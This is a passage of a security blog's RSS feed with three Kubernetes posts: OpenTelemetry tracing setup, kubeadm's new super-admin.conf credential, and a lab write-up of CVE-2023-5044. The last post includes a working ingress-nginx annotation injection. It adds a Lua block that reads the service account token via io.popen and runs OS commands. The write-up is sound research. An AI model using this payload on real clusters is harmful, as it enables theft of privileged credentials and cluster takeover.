&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run &lt;span class=&quot;nt&quot;&gt;--rm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;COLLECTOR_ZIPKIN_HOST_PORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;:9411 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 16686:16686 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 44317:4317 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 44318:4318 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 49411:9411 jaegertracing/all-in-one:latest
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As I’m running both containers on the same host, I’m using non-standard ports to avoid conflicts.&lt;/p&gt;

&lt;h2 id=&quot;viewing-traces&quot;&gt;Viewing Traces&lt;/h2&gt;

&lt;p&gt;Now we’ve got the cluster up and running and our OTel collector and backends setup, we can start to see traces. This is a screenshot of how the traces look in Datadog.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/datadog-k8s-trace-list.png&quot; alt=&quot;Datadog trace list&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s quite a bit of information in these traces, showing the internal operations of the cluster. We can see the schedulers and controller manager making requests to the API server as well as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-probe&lt;/code&gt; checking the health of the API server.&lt;/p&gt;

&lt;p&gt;From a security standpoint, whilst this is no replacement for audit logging, there is some interesting data there, although in production it’s worth remembering that traces would likely be sampled and not 100% of them would be sent to the backend.&lt;/p&gt;

&lt;h2 id=&quot;setting-up-docker-with-otel&quot;&gt;Setting up Docker with OTel&lt;/h2&gt;

&lt;p&gt;There’s also support for tracing in Docker, which is enabled by adding environment variables to the service. If you’ve got Docker running under systemd, you can edit the service file to add the environment variables.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl edit docker.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And then add the environment variables to the service file (replace 192.168.41.107 with the IP of your collector)&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]
&lt;span class=&quot;nv&quot;&gt;Environment&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;OTEL_EXPORTER_OTLP_ENDPOINT=http://192.168.41.107:4318&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that you can do a daemon-reload and then restart the service and you’ll get traces showing up in your backend(s).&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As Open Telemetry uptake increases, it’s likely that many services that we use will get support for it, enabling a standardized approach to observability instrumentation to be established. From a security standpoint, this has quite a bit of promise for improving our access to security information generated by applications, so it’ll be interesting to see how it develops.&lt;/p&gt;
</description>
				<pubDate>Sat, 10 Feb 2024 09:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/02/10/adding-open-telemetry-to-container-stacks/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/02/10/adding-open-telemetry-to-container-stacks/</guid>
			</item>
		
			<item>
				<title>When is admin not admin?, when it's super-admin!</title>
				<description>&lt;p&gt;I came across an interesting change in how Kubeadm based clusters handle initial credential setup in Kubernetes 1.29 and later, so thought it was worth a quick post. &lt;a href=&quot;https://twitter.com/smarticu5&quot;&gt;Smarticu5&lt;/a&gt; had a really unusual error, which was that on a newly created Kubeadm cluster he was getting a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forbidden&lt;/code&gt; error when using the default &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; credential created by Kubeadm.&lt;/p&gt;

&lt;p&gt;This specific error &lt;em&gt;shouldn’t&lt;/em&gt; be possible, as traditionally &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; is a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; group which bypasses RBAC checks and always gets full cluster-admin level access to everything, so if a valid credential is presented, it should always work.&lt;/p&gt;

&lt;p&gt;Interest piqued, we took a bit of a closer look at what was happening. First up was to decode the client certificate on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; file to see what usernames and groups it was associated with (If you’re ever looking to do this and can’t remember the exact commands, I’d recommend using &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;Cyber Chef&lt;/a&gt; which can base64 decode, and decode X.509 certs).&lt;/p&gt;

&lt;p&gt;The output we got back was this:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubernetes
Subject
  O  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubeadm:cluster-admins
  CN &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; kubernetes-admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sooo this credential was no longer a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt;, interesting! Next step, as is often the case when spelunking around in Kubernetes was to go look at Github to see if any recent changes had been made to how things work. Sure enough, there was a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/121305&quot;&gt;PR&lt;/a&gt; which explained how Kubeadm now has two files with initial credentials, the original &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; and a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; has been changed to use an RBAC group for access, which should give it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cluster-admin&lt;/code&gt; rights, but in a way that they could be revoked by removing the rights of that group, and then have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file still be a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:masters&lt;/code&gt; whose rights can’t be revoked by modifying RBAC.&lt;/p&gt;

&lt;p&gt;Digging back from this PR, to the referenced issue to get some back-story, I got a slight surprise to find it was &lt;a href=&quot;https://github.com/kubernetes/kubeadm/issues/2414&quot;&gt;one I’d opened&lt;/a&gt; back in 2021 about not using system:masters!&lt;/p&gt;

&lt;h2 id=&quot;what-does-this-mean&quot;&gt;What does this mean?&lt;/h2&gt;

&lt;p&gt;There’s a couple of practical consequences to consider with this change.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;If you’re tracking permissions on sensitive files, and access to them, where you’re using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubeadm&lt;/code&gt; based Kubernetes distribution, you will need to update your tracking to include the new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file.&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;super-admin.conf&lt;/code&gt; file should &lt;em&gt;not&lt;/em&gt; be used for any administrative tasks, instead place it somewhere safe and only use it if RBAC gets completely messed up. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; isn’t ideal either as it’s a generic account, but at least its permissions can be revoked now!&lt;/li&gt;
  &lt;li&gt;It is now possible to see a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forbidden&lt;/code&gt; error when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin.conf&lt;/code&gt; if RBAC isn’t fully configured, or if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clusterrolebinding&lt;/code&gt; for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubeadm:cluster-admins&lt;/code&gt; group has been changed.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Another example of why it’s important to keep up to date with changes in Kubernetes, and to understand how your cluster is configured. This change is a good one, as it makes it easier to revoke the rights of the initial credential, but it’s important to understand how it works, and how it might impact your cluster.&lt;/p&gt;
</description>
				<pubDate>Sat, 06 Jan 2024 09:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2024/01/06/when-is-admin-not-admin/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2024/01/06/when-is-admin-not-admin/</guid>
			</item>
		
			<item>
				<title>Exploiting CVE-2023-5044</title>
				<description>&lt;p&gt;Recently several new CVEs in the ingress nginx controller for Kubernetes were announced. I thought I’d take a closer look at one of them, CVE-2023-5044. Whilst there’s some details in the &lt;a href=&quot;https://github.com/kubernetes/ingress-nginx/issues/10572&quot;&gt;CVE announcement&lt;/a&gt; and some hints in a post from the CVE reporter &lt;a href=&quot;https://www.linkedin.com/posts/jkroepke_kubernetes-cve-2023-5044-code-injection-activity-7123677225765228545-93MI?trk=public_profile_share_view&quot;&gt;here&lt;/a&gt; there’s not any actual PoC that I could find, so I decided to see if I could write one!&lt;/p&gt;

&lt;h2 id=&quot;test-environment-setup&quot;&gt;Test environment setup&lt;/h2&gt;

&lt;p&gt;As is often the case, the easiest way to set up a test environment was to use &lt;a href=&quot;https://kind.sigs.k8s.io/&quot;&gt;KinD&lt;/a&gt;. They have a page with instructions for ingress setups &lt;a href=&quot;https://kind.sigs.k8s.io/docs/user/ingress/&quot;&gt;here&lt;/a&gt; which works well.&lt;/p&gt;

&lt;p&gt;Once we have ingress setup with the sample applications provided curl’ing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/foo&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://localhost/bar&lt;/code&gt; will hit paths managed by the ingress controller.&lt;/p&gt;

&lt;h2 id=&quot;experimenting-with-the-vulnerability&quot;&gt;Experimenting with the vulnerability&lt;/h2&gt;

&lt;p&gt;So we know from the advisory that the problem lies in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx.ingress.kubernetes.io/permanent-redirect&lt;/code&gt; annotation, so one of the first things I thought to try was classic command injection where you end the statement that’s being provided and start a new directive. In the case of nginx this uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; character, so I tried that and it seemed to work!&lt;/p&gt;

&lt;p&gt;Exec’ing into the ingress controller pod, I could see that what happens with this annotation is that anything you provide is basically injected directly into the nginx config file used by the controller.&lt;/p&gt;

&lt;p&gt;One option I experimented with, as it seems like a good way to get access to sensitive files (like the service account token for the controller which has high privileges to the cluster) would be to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;alias&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; directives to serve up the file. However these directives have &lt;a href=&quot;https://github.com/kubernetes/ingress-nginx/pull/8624&quot;&gt;been disabled&lt;/a&gt; so that wasn’t going to work.&lt;/p&gt;

&lt;p&gt;Fortunately I remembered that lua scripting is sometimes supported in nginx, so we might be able to use that. With a bit of help from ChatGPT on the exact syntax of what to use, I was able to get a working PoC.&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;nginx.ingress.kubernetes.io/permanent-redirect&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://www.mccune.org.uk;}location ~* &quot;^/flibble(/|$)(.*)&quot; {content_by_lua &apos;ngx.say(io.popen(&quot;cat /var/run/secrets/kubernetes.io/serviceaccount/token&quot;):read(&quot;*a&quot;))&apos;;}location ~* &quot;^/flibblea(/|$)(.*)&quot; { content_by_lua &apos;os.execute(&quot;touch /you&quot;)&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This could definitely be neater, but what it does is close off the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location&lt;/code&gt; directive with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;}&lt;/code&gt; after the URL that we’re redirecting to. Then open a new &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;location&lt;/code&gt; on the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/flibble&lt;/code&gt;. When someone calls that path we run a lua script that uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;io.popen&lt;/code&gt; to run an OS command and then returns that to the caller using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx.say&lt;/code&gt;. After that I just put another location directive to absorb any unwanted directives that were already in the file (it’s important that you balance up the braces in the file, otherwise your change will get rejected).&lt;/p&gt;

&lt;p&gt;With that in place you can curl &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;localhost/flibble&lt;/code&gt; and get back the service account token for the ingress which has high privileges to the cluster, notably GET secrets at the cluster level.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;This is an interesting vulnerability and one that (despite being a bit fiddly) wasn’t too difficult to exploit. In terms of risk however, it’s quite situational as it requires rights to edit &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ingress&lt;/code&gt; objects in a namespace, so it’s not something an attacker outside the cluster is likely to be able to execute.&lt;/p&gt;
</description>
				<pubDate>Sun, 29 Oct 2023 09:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/10/29/exploiting-CVE-2023-5044/</guid>
			</item>
		
	</channel>
</rss>
